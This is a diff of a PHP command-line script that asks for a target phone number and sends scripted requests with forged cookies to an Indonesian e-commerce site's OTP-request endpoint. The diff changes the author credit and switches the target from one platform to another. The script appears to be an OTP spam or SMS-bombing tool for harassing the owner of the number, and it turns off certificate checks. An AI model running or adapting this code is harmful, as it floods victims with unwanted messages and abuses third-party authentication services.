@@ -1,5 +1,5 @@
 <?php
-echo "AUTOR: SGB MR_XID\n\n";
+echo "AUTOR: MR_XID\n\n";
 echo "Nomor Target bos?\nInput : ";
 $nomer = trim(fgets(STDIN));
 if(strlen($nomer)==11){
@@ -41,7 +41,7 @@ Cookie: identity=".$rand1."; browser_id=".$rand2."; _ga=GA1.2.1024758930.1531960
                              )
                            );
 	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, "https://m.bukalapak.com/trusted_devices/otp_request");
+	curl_setopt($ch, CURLOPT_URL, "https://m.tokopedia.com/trusted_devices/otp_request");
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
